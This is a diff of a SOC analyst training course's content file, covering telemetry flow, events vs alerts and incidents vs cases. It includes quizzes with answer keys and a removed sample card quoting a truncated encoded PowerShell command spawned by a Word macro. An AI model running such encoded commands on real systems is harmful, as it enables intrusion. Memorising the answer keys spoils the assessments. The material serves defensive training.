+          "knowMore": {
+            "title": "MITRE ATT&CK: Data Source Mapping and Ingestion Visibility",
+            "description": "Learn how modern SOCs align their log ingestion pipelines with MITRE ATT&CK techniques to eliminate detection blind spots.",
+            "externalUrl": "https://attack.mitre.org/datasources/",
+            "externalLabel": "MITRE Data Sources"
+          }
+        },
+        "demo": {
+                  "title": "[Demo] Follow the Security Signal",
+                  "subtitle": "Trace a security signal from an employee workstation all the way to an L1 analyst alert",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Employee Activity",
+                                      "iconName": "endpoint",
+                                      "title": "User Interacts with Workstation",
+                                      "description": "Employee Finance01 logs into workstation FIN-PC-04 on the FinCorp internal network.",
+                                      "telemetrySnippet": "SIGNAL 1: Interactive logon initiated on workstation FIN-PC-04 by user Finance01.",
+                                      "highlightText": "All enterprise telemetry begins with human or automated activity on computing systems."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Security Data Generated",
+                                      "iconName": "server",
+                                      "title": "Local OS & Sensor Record Telemetry",
+                                      "description": "The operating system records logon events, process executions, and network socket creations.",
+                                      "telemetrySnippet": "SIGNAL 2: Windows Security Event 4625 recorded (Bad Password). Local sensor captures event.",
+                                      "highlightText": "Security sensors convert physical and software interactions into structured telemetry records."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Security Platform Ingestion",
+                                      "iconName": "siem",
+                                      "title": "Telemetry Streamed to Central Platform",
+                                      "description": "Logs stream securely across the internal network to the centralized security data platform.",
+                                      "telemetrySnippet": "SIGNAL 3: Telemetry packet transmitted to central SIEM cluster for parsing and indexing.",
+                                      "highlightText": "Reliable log forwarding ensures timely ingestion without data loss."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Detection Engine Evaluation",
+                                      "iconName": "attacker",
+                                      "title": "Correlation Rule Identifies Anomaly",
+                                      "description": "Detection logic recognizes a cluster of failed attempts exceeding normal baseline thresholds.",
+                                      "telemetrySnippet": "SIGNAL 4: Rule 'Multiple Failed Logins' triggered: Count = 18 in 2 minutes.",
+                                      "highlightText": "Detection rules turn passive event data into active, prioritized security signals."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. SOC Alert Dispatched",
+                                      "iconName": "analyst",
+                                      "title": "Alert Placed in L1 Analyst Queue",
+                                      "description": "A structured alert appears in the SOC console ready for an L1 analyst to begin triage.",
+                                      "telemetrySnippet": "SIGNAL 5: Alert ALT-2026-04 created | Severity: Medium | Assigned to L1 Triage Queue.",
+                                      "highlightText": "The completed data pipeline delivers timely, actionable intelligence directly to the analyst."
+                            }
+                  ]
+        },
+        "interactive": {
+                  "title": "[Interactive] Trace the Alert",
+                  "scenario": "Click the stages in order to trace the complete security signal path from initial user activity to the L1 analyst.",
+                  "cards": [
+                            {
+                                      "id": "sig-src",
+                                      "category": "User",
+                                      "label": "Step 1: Source Activity",
+                                      "summary": "Employee Finance01 attempts password entry on workstation FIN-PC-04.",
+                                      "detailedFindings": "Initial user interaction generates local authentication telemetry on the host.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "sig-data",
+                                      "category": "Event ID",
+                                      "label": "Step 2: Security Telemetry",
+                                      "summary": "Operating system generates Event 4625 audit records and sensor telemetry.",
+                                      "detailedFindings": "Structured event data is captured with timestamps, usernames, and host IP addresses.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "sig-det",
+                                      "category": "Source IP",
+                                      "label": "Step 3: Detection Logic",
+                                      "summary": "Central SIEM correlation rule evaluates incoming event threshold.",
+                                      "detailedFindings": "Rule identifies 18 failed login attempts within a narrow 2-minute time window.",
+                                      "severityIndicator": "Suspicious"
+                            },
+                            {
+                                      "id": "sig-alert",
+                                      "category": "Timeline",
+                                      "label": "Step 4: SOC Alert & Analyst Triage",
+                                      "summary": "Alert ALT-2026-04 is generated and dispatched to the L1 analyst queue.",
+                                      "detailedFindings": "Analyst receives actionable alert with extracted entities ready for immediate triage.",
+                                      "severityIndicator": "Normal"
+                            }
+                  ]
+        },
+        "socContext": {
+          "title": "Understanding Telemetry Delays (Latency & Jitter)",
+          "scenario": "An attacker compromises a laptop while the employee is traveling on an airplane. No logs reach the SIEM until the VPN reconnects.",
+          "analystMindset": "Always compare Event Timestamp (when it happened on the host) vs Ingestion Timestamp (when the SIEM received it). A 4-hour delay indicates host disconnection or forwarder queuing.",
+          "bestPractices": [
+            "Account for timezone conversions (ensure all SIEM queries standardize on UTC).",
+            "Investigate ingestion lag if alerts appear minutes or hours after process execution.",
+            "Report broken forwarders immediately to maintain visibility coverage."
+          ]
+        },
+        "knowledgeCheck": {
+          "dragDrop": {
+            "title": "Sequence the SOC Data Flow",
+            "instructions": "Drag and arrange the 5 stages of security data flow in their correct sequential order from origin to analyst.",
+            "items": [
+              {
+                "id": "df-1",
+                "label": "Event Generation on Host (Process execution / network socket)",
+                "order": 1
+              },
+              {
+                "id": "df-2",
+                "label": "Forwarder Transmission (Encrypted log shipping via TLS)",
+                "order": 2
+              },
+              {
+                "id": "df-3",
+                "label": "SIEM Parsing & Normalization (Extracting standard CIM fields)",
+                "order": 3
+              },
+              {
+                "id": "df-4",
+                "label": "Correlation Rule Trigger (Detection criteria met, alert created)",
+                "order": 4
+              },
+              {
+                "id": "df-5",
+                "label": "Analyst Triage & Qualification (L1 claims ticket and verifies IOCs)",
+                "order": 5
+              }
+            ],
+            "explanation": "Telemetry originates on the host, travels via log forwarders to the SIEM, undergoes normalization and correlation, and finally surfaces as an analyst alert."
+          }
+        }
+      }
     ],
-    assessment: {
-      id: 'unit-1-assessment',
-      title: 'Unit 1 Assessment: SOC Architecture',
-      passingScore: 80,
-      xpReward: 150,
-      questions: [
+    "assessment": {
+      "id": "unit-1-assessment",
+      "title": "Unit 1 Challenge: Elena Gomez Shift Handover Briefing",
+      "passingScore": 75,
+      "xpReward": 100,
+      "questions": [
         {
-          id: 'u1-q1',
-          question: 'What are the three core pillars of the SOC triad?',
-          options: [
-            'Firewalls, Antivirus, and Backups',
-            'People, Process, and Technology',
-            'Hardware, Software, and Network Cables',
-            'Managers, Developers, and System Admins',
+          "id": "u1-q1",
+          "question": "What are the three fundamental pillars that form the foundation of any effective SOC?",
+          "options": [
+            "Hardware, Software, Firmware",
+            "People, Process, Technology",
+            "Firewalls, Antivirus, SIEM",
+            "Identification, Protection, Recovery"
           ],
-          correctAnswer: 1,
-          explanation: 'The SOC triad is composed of People (analysts), Process (playbooks & SLAs), and Technology (SIEM, EDR).',
+          "correctAnswer": 1,
+          "explanation": "The three foundational pillars of a SOC are People (analysts), Process (SOPs and playbooks), and Technology (monitoring tools)."
         },
         {
-          id: 'u1-q2',
-          question: 'What is the primary role of a Tier 1 (L1) SOC Analyst?',
-          options: [
-            'Writing company security policies and purchasing software',
-            'Initial alert triage, false-positive filtering, and escalating true threats',
-            'Reverse engineering malware binaries and firmware',
-            'Physically repairing damaged server hardware in the datacenter',
+          "id": "u1-q2",
+          "question": "In a tiered SOC hierarchy, what is the primary operational responsibility of a Tier 1 Analyst?",
+          "options": [
+            "Malware reverse engineering and memory extraction",
+            "Writing executive risk disclosures for the board",
+            "Triage inbound alerts, extract entities, verify IOCs, and escalate true threats within SLA",
+            "Designing enterprise firewall architectures"
           ],
-          correctAnswer: 1,
-          explanation: 'Tier 1 analysts act as the 24/7 frontline triage sentries, reviewing alert queues and filtering false positives.',
+          "correctAnswer": 2,
+          "explanation": "Tier 1 analysts handle initial queue triage, entity validation, basic containment, and escalation within SLA timeframes."
         },
         {
-          id: 'u1-q3',
-          question: 'Why is log field normalization (e.g. ECS or CIM) essential in a modern SIEM?',
-          options: [
-            'It changes all log timestamps into alphabetical letters',
-            'It maps different vendor log formats into unified field names so correlation rules work across all systems',
-            'It deletes 90% of log files to save hard drive space',
-            'It hides the identity of the analyst who viewed the log',
+          "id": "u1-q3",
+          "question": "Why is log normalization to a Common Information Model (CIM) essential in a modern SIEM?",
+          "options": [
+            "It compresses logs to zero bytes",
+            "It allows unified detection rules to query fields consistently across heterogeneous vendors (Windows, Linux, Palo Alto)",
+            "It eliminates the need for Tier 2 analysts",
+            "It encrypts local workstation hard drives"
           ],
-          correctAnswer: 1,
-          explanation: 'Normalization maps disparate vendor schemas (e.g., `src_ip`, `SourceAddress`, `ip_src`) into one standard field (`source.ip`).',
+          "correctAnswer": 1,
+          "explanation": "Normalization standardizes field names (e.g. src_ip, user, process_name) so rules can detect attacks regardless of the log vendor source."
         },
         {
-          id: 'u1-q4',
-          question: 'What is the operational consequence of high ingestion lag in a telemetry pipeline?',
-          options: [
-            'The SIEM runs out of license keys',
-            'Adversaries gain dwell time because analysts receive alerts long after the attack occurred',
-            'Workstations will reboot automatically without warning',
-            'Alerts become false positives automatically',
+          "id": "u1-q4",
+          "question": "When comparing Event Time vs Ingestion Time in an alert investigation, a large time difference usually indicates:",
+          "options": [
+            "A cyberattack in progress",
+            "Telemetry latency caused by offline endpoints, slow network pipes, or forwarder queuing",
+            "The SIEM clock is broken",
+            "The alert is definitely a false positive"
           ],
-          correctAnswer: 1,
-          explanation: 'Ingestion lag delays alerts, giving adversaries unmonitored dwell time to move laterally and exfiltrate data.',
-        },
-        {
-          id: 'u1-q5',
-          question: 'Which tool provides deep host visibility into running processes, loaded DLLs, and memory?',
-          options: [
-            'Network Switch',
-            'Endpoint Detection and Response (EDR)',
-            'Domain Name System (DNS)',
-            'Load Balancer',
-          ],
-          correctAnswer: 1,
-          explanation: 'EDR agents reside directly on endpoints, providing real-time visibility into process executions, DLL loads, and network sockets.',
-        },
-      ],
-    },
+          "correctAnswer": 1,
+          "explanation": "A gap between Event Time (endpoint occurrence) and Ingestion Time (SIEM receipt) indicates network latency, offline machines, or forwarder backlog."
+        }
+      ]
+    }
   },
-
-  // =========================================================================
-  // UNIT 2: ALERTS & EVENTS
-  // =========================================================================
   {
-    id: 'unit-2',
-    unitNumber: 2,
-    title: 'Unit 2: Alerts & Events',
-    description: 'Understand the critical differences between raw system events, triggered alerts, verified incidents, and master investigation cases.',
-    estimatedHours: 2,
-    topics: [
+    "id": "unit-2",
+    "unitNumber": 2,
+    "title": "Unit 2: Alerts & Events",
+    "description": "Learn the strict operational taxonomy separating raw log Events from SIEM Alerts, qualified Incidents, and legal Cases.",
+    "estimatedHours": 0.42,
+    "topics": [
       {
-        id: 'topic-2-1',
-        unitId: 'unit-2',
-        title: 'Events vs. Alerts: Signal from Noise',
-        order: 1,
-        estimatedMinutes: 20,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'An Event is any observable occurrence in an IT system (e.g., a file written, a user login, a DNS query).',
-            'An enterprise generates billions of events daily—99.999% of which are normal, routine business activities.',
-            'An Alert is generated only when an event (or group of correlated events) matches a predefined detection rule or anomaly threshold.',
-            'For example: A single failed password attempt is a routine Event (Event ID 4625). 200 failed attempts within 60 seconds triggers a Brute-Force Alert.',
-            'Analysts must never treat raw events as alarms until verified by correlation rules and contextual evidence.',
+        "id": "topic-2-1",
+        "unitId": "unit-2",
+        "title": "Chapter 1: Events vs. Alerts",
+        "order": 1,
+        "estimatedMinutes": 12,
+        "xpReward": 50,
+        "theory": {
+          "summaryLines": [
+            "An Event is any observable occurrence in a system, network, or application (e.g. user login, DNS query, firewall packet drop).",
+            "An enterprise generates billions of events daily—99.99% of which are normal, benign business activities.",
+            "An Alert is an event (or correlated sequence of events) that meets a predefined detection rule or statistical threshold indicating potential malicious activity.",
+            "Alerts require human or automated investigation to evaluate context and determine legitimacy.",
+            "Confusing raw events with alerts leads to catastrophic analyst burnout and alert fatigue."
           ],
-          knowMore: {
-            title: 'MITRE ATT&CK: Detection & Behavioral Analytics',
-            description: 'Learn how modern detection engineers craft rules that convert high-volume telemetry into actionable alerts.',
-            externalUrl: 'https://attack.mitre.org/',
-            externalLabel: 'Explore MITRE ATT&CK Matrix',
-          },
+          "knowMore": {
+            "title": "SANS Institute: From Logs to Security Events and Alerts",
+            "description": "Read the SANS guide on event filtering, correlation rules, and reducing noise in enterprise monitoring systems.",
+            "externalUrl": "https://www.sans.org/white-papers/33209/",
+            "externalLabel": "SANS Event Management"
+          }
         },
-        demo: {
-          title: 'From 1,000,000 Events to 1 High-Fidelity Alert',
-          subtitle: 'Visualizing how SIEM correlation rules filter background noise to pinpoint malicious behavior.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'The Raw Event Flood',
-              description: 'Hundreds of thousands of routine events arrive every second: email syncs, background services, network pings.',
-              visualType: 'network',
-              highlightElements: ['event-flood', 'routine-noise'],
-              narration: 'Without correlation, an analyst would drown in routine events within seconds.',
-            },
-            {
-              stepNumber: 2,
-              title: 'The Correlation Filter',
-              description: 'A threshold rule triggers when a single user account fails authentication 15 times and then immediately succeeds from an overseas IP.',
-              visualType: 'dashboard',
-              highlightElements: ['threshold-filter', 'alert-triggered'],
-              narration: 'The correlation rule filters the noise and generates an actionable alert.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] Something Happened: Activity to Alert",
+                  "subtitle": "Understand how normal events are recorded and when patterns elevate into an actionable alert",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Activity Occurs",
+                                      "iconName": "endpoint",
+                                      "title": "User Enters Password",
+                                      "description": "Finance01 types a password on FIN-PC-04. The operating system evaluates the credentials against Active Directory.",
+                                      "telemetrySnippet": "LOGON_PROMPT: User 'Finance01' submitting authentication request on workstation FIN-PC-04.",
+                                      "highlightText": "Routine computer interactions occur continuously across the enterprise."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Event Recorded",
+                                      "iconName": "server",
+                                      "title": "Single Security Event Generated",
+                                      "description": "One login attempt generates a single security event recording what happened, timestamped in the log.",
+                                      "telemetrySnippet": "EVENT: ID=4625 | Status=0xC000006A (Bad Password) | User=Finance01 | Time=10:31:40",
+                                      "highlightText": "An event is a neutral, factual historical record that an action occurred."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Pattern Emerges",
+                                      "iconName": "attacker",
+                                      "title": "Multiple Related Events Occur",
+                                      "description": "Within 60 seconds, 4 additional failed attempts occur in quick succession for the same account.",
+                                      "telemetrySnippet": "EVENT CLUSTER: 10:31:44 (Fail) | 10:31:47 (Fail) | 10:31:52 (Fail) | Total Failures: 4",
+                                      "highlightText": "Single events are rarely dangerous; patterns of repeated events signal potential issues."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Pattern Recognition",
+                                      "iconName": "siem",
+                                      "title": "SIEM Detection Rule Evaluates Stream",
+                                      "description": "The correlation engine evaluates the event stream and identifies abnormal frequency exceeding normal baseline.",
+                                      "telemetrySnippet": "CORRELATION: Threshold breached (>3 failures in 1 min) | Condition: TRUE",
+                                      "highlightText": "Detection logic transforms raw event streams into meaningful pattern indicators."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Alert Dispatched",
+                                      "iconName": "analyst",
+                                      "title": "Alert Placed in Queue for Review",
+                                      "description": "An alert appears on the L1 analyst dashboard, elevating the activity from passive log storage to active human review.",
+                                      "telemetrySnippet": "ALERT: Multiple Failed Login Attempts | Target: Finance01 | Host: FIN-PC-04 | Priority: Medium",
+                                      "highlightText": "An event records activity. An alert brings potentially important activity to analyst attention."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Event vs. Alert Interactive Classifier',
-          scenario: 'Review 3 incoming log telemetry snippets and classify whether each item is merely a raw Event or a qualified Alert.',
-          cards: [
-            {
-              id: 'card-ev1',
-              title: 'Kerberos Ticket Granting Request',
-              source: 'Domain Controller',
-              timestamp: '14:22:01 UTC',
-              category: 'user',
-              summary: 'Standard Kerberos TGS request from user `accounting_mgr` to access the departmental file share.',
-              details: [
-                { label: 'Event ID', value: '4769' },
-                { label: 'Ticket Encryption', value: 'AES256 (Standard)' },
-                { label: 'Classification', value: 'Routine System Event' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 20,
-              tags: ['Event', 'Kerberos', 'Normal'],
-            },
-            {
-              id: 'card-ev2',
-              title: 'PowerShell Encoded Command & External Socket',
-              source: 'Finance Laptop',
-              timestamp: '14:22:45 UTC',
-              category: 'host',
-              summary: '`powershell.exe -enc JABjAGwAaQ...` executed by Word macro, opening connection to unclassified external IP.',
-              details: [
-                { label: 'Rule Triggered', value: 'Suspicious Living-Off-The-Land Binary' },
-                { label: 'Classification', value: 'High-Severity Alert' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 98,
-              tags: ['Alert', 'Malicious', 'Living-off-the-Land'],
-            },
-            {
-              id: 'card-ev3',
-              title: 'DNS Query to Known CDN',
-              source: 'Core Gateway',
-              timestamp: '14:23:10 UTC',
-              category: 'network',
-              summary: 'Outbound DNS lookup for `cdn.cloudflare.net` resolving successfully with TTL 300.',
-              details: [
-                { label: 'Reputation', value: 'Clean / Reputable CDN' },
-                { label: 'Classification', value: 'Routine Network Event' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 15,
-              tags: ['Event', 'DNS', 'Clean'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Event or Alert?",
+                  "scenario": "Classify each security occurrence as either a raw Event (informational log) or an actionable Alert (requires attention).",
+                  "cards": [
+                            {
+                                      "id": "ea-1",
+                                      "category": "User",
+                                      "label": "User successfully logged in at 09:00 AM",
+                                      "summary": "Event 4624 generated from employee's assigned workstation during standard working hours.",
+                                      "detailedFindings": "Classification: EVENT. Standard normal business activity that is logged for audit purposes but requires no analyst action.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "ea-2",
+                                      "category": "Source IP",
+                                      "label": "Firewall dropped inbound packet on port 23",
+                                      "summary": "Edge firewall blocked unsolicited Telnet connection from an external public IP address.",
+                                      "detailedFindings": "Classification: EVENT. Routine firewall enforcement dropping unsolicited traffic. Millions occur daily without needing triage.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "ea-3",
+                                      "category": "Event ID",
+                                      "label": "15 failed logins detected in 60 seconds",
+                                      "summary": "Abnormal volume of credential failures followed by temporary account lockout.",
+                                      "detailedFindings": "Classification: ALERT. A pattern of repeated failures crosses threshold and requires human triage to rule out brute force.",
+                                      "severityIndicator": "Suspicious"
+                            },
+                            {
+                                      "id": "ea-4",
+                                      "category": "Timeline",
+                                      "label": "Suspicious login pattern outside business hours",
+                                      "summary": "Finance executive account authenticating at 03:30 AM from a previously unseen overseas IP.",
+                                      "detailedFindings": "Classification: ALERT. High-risk behavioral anomaly requiring immediate validation against user travel schedules.",
+                                      "severityIndicator": "Suspicious"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'Alert Fatigue in the SOC',
-          scenario: 'A poorly configured SIEM rule generated 1,400 alerts whenever any user changed their screen resolution.',
-          analystMindset: 'Alert fatigue causes analysts to overlook legitimate threats. Rules must be tuned so that every alert represents a genuine anomaly requiring human decision.',
-          bestPractices: [
-            'Require multiple correlated events before firing a high-priority alert.',
-            'Review alert-to-incident ratios monthly; rules generating 0 incidents should be tuned or retired.',
-            'Correlate threat intelligence feeds directly into SIEM queries to boost alert fidelity.',
-          ],
+        "socContext": {
+          "title": "Managing the Alert-to-Event Ratio",
+          "scenario": "A SOC director notices analysts are closing 400 alerts an hour without investigating because threshold rules fire on every port scan.",
+          "analystMindset": "If an alert fires 100 times a day and 99 are ignored, it is not an alert—it is noise. Raise tuning tickets to fix noisy detection logic.",
+          "bestPractices": [
+            "Verify raw underlying events before forming a triage conclusion.",
+            "Check for event suppression or deduplication in the SIEM to prevent duplicate queue items.",
+            "Ensure alerts provide direct drill-down links to original raw event logs."
+          ]
         },
-        knowledgeCheck: {
-          matching: {
-            title: 'Classify Telemetry: Event vs. Alert',
-            instructions: 'Match each item with whether it represents a raw Event or an Alert.',
-            pairs: [
-              { id: 'ea-1', left: 'Single successful VPN login during office hours', right: 'Raw Event' },
-              { id: 'ea-2', left: '150 failed SSH logins followed by root login in 30 seconds', right: 'Security Alert' },
-              { id: 'ea-3', left: 'Workstation requests DHCP IP address renewal', right: 'Raw Event' },
-              { id: 'ea-4', left: 'Process memory dump tool `lsass.exe` accessed by untrusted binary', right: 'Security Alert' },
+        "knowledgeCheck": {
+          "matching": {
+            "title": "Classify Telemetry as Event vs Alert",
+            "instructions": "Match the description on the left with whether it constitutes an Event or an Alert.",
+            "pairs": [
+              {
+                "id": "ea1",
+                "left": "Firewall drops a single inbound packet on port 445",
+                "right": "Routine Network Event (Individual dropped packet log)"
+              },
+              {
+                "id": "ea2",
+                "left": "Host initiates 500 connections to external IPs in 5 seconds",
+                "right": "Network Anomaly Alert (Port scan / C2 burst detected)"
+              },
+              {
+                "id": "ea3",
+                "left": "Employee unlocks their Windows workstation at 9:00 AM",
+                "right": "Standard Authentication Event (Normal user login record)"
+              },
+              {
+                "id": "ea4",
+                "left": "Command line launches encoded web download script",
+                "right": "High-Priority Threat Alert (Adversary execution technique)"
+              }
             ],
-            explanation: 'Events record normal or raw system activity; Alerts signify rule violations or suspicious behavior patterns.',
-          },
-        },
+            "explanation": "Single operational occurrences are raw Events (log records); aggregated patterns matching threat signatures or anomaly thresholds are Actionable Alerts."
+          }
+        }
       },
       {
-        id: 'topic-2-2',
-        unitId: 'unit-2',
-        title: 'Incidents vs. Cases: The Escalation Lifecycle',
-        order: 2,
-        estimatedMinutes: 20,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'An Alert is an unverified notification that a rule was triggered.',
-            'An Incident is declared when an alert is investigated and confirmed to pose an active threat or violation of security policy.',
-            'Not all alerts become incidents: an alert triggered by an authorized IT penetration test is an alert, but not an unplanned incident.',
-            'A Case is the formal container or digital folder in the ticketing system (e.g. ServiceNow SecOps, Jira, TheHive).',
-            'A single Case bundles all correlated alerts, affected endpoints, user identities, timeline notes, evidence files, and remediation tasks together.',
+        "id": "topic-2-2",
+        "unitId": "unit-2",
+        "title": "Chapter 2: Incidents & Cases",
+        "order": 2,
+        "estimatedMinutes": 13,
+        "xpReward": 50,
+        "theory": {
+          "summaryLines": [
+            "An Alert becomes an Incident when an analyst investigates and confirms that unauthorized, malicious, or policy-violating activity has actually occurred.",
+            "Not all alerts are incidents: false positives are closed, and benign true positives are handled without formal incident declaration.",
+            "A Case is the formal operational and legal container tracking the entire incident lifecycle (evidence artifacts, timeline, notes, remediation).",
+            "Cases maintain chain of custody, track billable hours, record regulatory notification deadlines, and support post-incident audits.",
+            "Summary Hierarchy: Millions of Events -> Thousands of Alerts -> Tens of Confirmed Incidents -> Documented Cases."
           ],
-          knowMore: {
-            title: 'NIST SP 800-61 Rev. 2: Incident Handling Guide',
-            description: 'The industry-standard computer security incident handling lifecycle from preparation to post-incident activity.',
-            externalUrl: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final',
-            externalLabel: 'Read NIST SP 800-61',
-          },
+          "knowMore": {
+            "title": "ISO/IEC 27035: Information Security Incident Management Standard",
+            "description": "Learn the international standard for managing security incidents, structuring investigation cases, and documenting legal evidence.",
+            "externalUrl": "https://www.iso.org/standard/60803.html",
+            "externalLabel": "ISO 27035 Incident Standard"
+          }
         },
-        demo: {
-          title: 'From Alert to Incident to Case',
-          subtitle: 'Tracing the complete lifecycle of a confirmed security incident.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'Alert Triage Validation',
-              description: 'The analyst reviews the raw alert, inspects command parameters, and confirms unauthorized malicious execution.',
-              visualType: 'terminal',
-              highlightElements: ['alert-review', 'confirmation'],
-              narration: 'Once verified as malicious, the alert is declared an Incident.',
-            },
-            {
-              stepNumber: 2,
-              title: 'Case Aggregation',
-              description: 'The analyst creates a Case container, binding 3 related alerts, 2 affected hosts, and the compromised user into a single ticket.',
-              visualType: 'dashboard',
-              highlightElements: ['case-creation', 'evidence-binding'],
-              narration: 'The Case serves as the master record for response, containment, and post-mortem analysis.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] From Alert to Investigation",
+                  "subtitle": "Watch an unverified alert transition into a confirmed incident and an organized case record",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Unverified Alert",
+                                      "iconName": "siem",
+                                      "title": "Alert ALT-2026-04 Enters Triage",
+                                      "description": "L1 claims the alert for multiple failed login attempts on Finance01. At this stage, it is merely an unverified indicator.",
+                                      "telemetrySnippet": "STATE: Alert | ID: ALT-2026-04 | Status: Unverified | Trigger: Multiple Failed Logins",
+                                      "highlightText": "Alerts represent unverified security signals that require human validation."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Analyst Triage",
+                                      "iconName": "analyst",
+                                      "title": "Analyst Inspects Activity Context",
+                                      "description": "L1 reviews recent host activity and observes subsequent unauthorized access commands executed on FIN-PC-04.",
+                                      "telemetrySnippet": "FINDING: Failed logins were followed by unauthorized privilege escalation script execution.",
+                                      "highlightText": "Triage separates harmless anomalies from genuine security threats."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Declared Incident",
+                                      "iconName": "attacker",
+                                      "title": "Security Issue Confirmed",
+                                      "description": "Analyst confirms unauthorized access. The alert is formally upgraded to an active Incident.",
+                                      "telemetrySnippet": "UPGRADE: Alert -> INCIDENT | Classification: Unauthorized Access | Scope: Workstation FIN-PC-04",
+                                      "highlightText": "An incident is a confirmed violation or imminent threat to computer security policies."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Case Created",
+                                      "iconName": "server",
+                                      "title": "Formal Investigation Case Opened",
+                                      "description": "A formal Case is established to organize forensic artifacts, assign remediation tasks, and track response timeline.",
+                                      "telemetrySnippet": "CASE MANAGEMENT: Case #INC-2026-104 Created | Owner: Tier 2 Response | SLA: Active",
+                                      "highlightText": "A case is the structured investigation file that tracks evidence, actions, and resolution."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Coordinated Resolution",
+                                      "iconName": "analyst",
+                                      "title": "Remediation & Closure",
+                                      "description": "Host is isolated, malicious processes terminated, credentials rotated, and lessons documented in the case record.",
+                                      "telemetrySnippet": "RESOLUTION: Eradication Complete | Systems Verified | Final Report Filed",
+                                      "highlightText": "Structured cases ensure accountability and thorough remediation across the organization."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Incident Lifecycle Progression Simulator',
-          scenario: 'Walk an active security event through its lifecycle: from raw log to alert, incident confirmation, and case creation.',
-          cards: [
-            {
-              id: 'card-lc1',
-              title: 'Phase 1: Raw Telemetry (Event)',
-              source: 'Edge Firewall',
-              timestamp: '10:00:00 UTC',
-              category: 'network',
-              summary: 'Inbound connection attempts observed on port 445 (SMB) from external IP.',
-              details: [
-                { label: 'Volume', value: '1 packet' },
-                { label: 'Status', value: 'Logged by Firewall' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 30,
-              tags: ['Event', 'Raw'],
-            },
-            {
-              id: 'card-lc2',
-              title: 'Phase 2: Detection Rule Triggered (Alert)',
-              source: 'SIEM Correlation Rule',
-              timestamp: '10:01:15 UTC',
-              category: 'user',
-              summary: 'Rule fired: `Port 445 Sweep across Internal Subnet from Workstation-09`.',
-              details: [
-                { label: 'Severity', value: 'High' },
-                { label: 'Queue Status', value: 'Pending L1 Triage' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 85,
-              tags: ['Alert', 'Rule Match'],
-            },
-            {
-              id: 'card-lc3',
-              title: 'Phase 3: Confirmed Malicious Breach (Incident & Case)',
-              source: 'Incident Response Ticket #SEC-892',
-              timestamp: '10:06:30 UTC',
-              category: 'host',
-              summary: 'Workstation-09 confirmed infected with lateral-movement worm. Case #SEC-892 opened for multi-host isolation.',
-              details: [
-                { label: 'Status', value: 'Active P1 Incident' },
-                { label: 'Assigned To', value: 'L2 IR Lead & Threat Hunter' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 100,
-              tags: ['Incident', 'Case', 'Active Threat'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Where Does It Belong?",
+                  "scenario": "Categorize each security situation into the appropriate level: Event, Alert, Incident, or Case.",
+                  "cards": [
+                            {
+                                      "id": "cat-event",
+                                      "category": "User",
+                                      "label": "Backup Server Routine Connection",
+                                      "summary": "Scheduled database backup completes successfully at 02:00 AM, logging 40 MB data transfer.",
+                                      "detailedFindings": "Level: EVENT. Expected baseline log entry that records normal system behavior.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "cat-alert",
+                                      "category": "Event ID",
+                                      "label": "Unusual Spike in Failed Logins",
+                                      "summary": "SIEM fires detection for 18 failed login attempts on workstation FIN-PC-04.",
+                                      "detailedFindings": "Level: ALERT. A triggered rule flagging an anomaly that requires human analyst review.",
+                                      "severityIndicator": "Suspicious"
+                            },
+                            {
+                                      "id": "cat-incident",
+                                      "category": "Source IP",
+                                      "label": "Confirmed Unauthorized Database Access",
+                                      "summary": "Triage confirms an external IP accessed customer payroll records without authorization.",
+                                      "detailedFindings": "Level: INCIDENT. A verified security breach violating organizational data confidentiality.",
+                                      "severityIndicator": "Malicious"
+                            },
+                            {
+                                      "id": "cat-case",
+                                      "category": "Timeline",
+                                      "label": "Multi-Team Investigation Record",
+                                      "summary": "Centralized file containing forensic logs, legal notifications, and remediation checklists.",
+                                      "detailedFindings": "Level: CASE. The administrative wrapper organizing evidence, actions, and post-incident reporting.",
+                                      "severityIndicator": "Normal"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'Managing Complex Multi-Alert Cases',
-          scenario: 'An attacker compromised an employee laptop, moved to a staging server, and attempted database exfiltration, triggering 12 separate alerts.',
-          analystMindset: 'Treating each alert as a separate ticket creates chaos. The analyst binds all 12 alerts into a single unified Case with one incident commander.',
-          bestPractices: [
-            'Group related alerts by attacker IP, session ID, or host to keep investigations unified.',
-            'Never close an incident ticket until containment, eradication, and recovery steps are verified.',
-            'Always document root-cause evidence within the case for future compliance audits.',
-          ],
+        "socContext": {
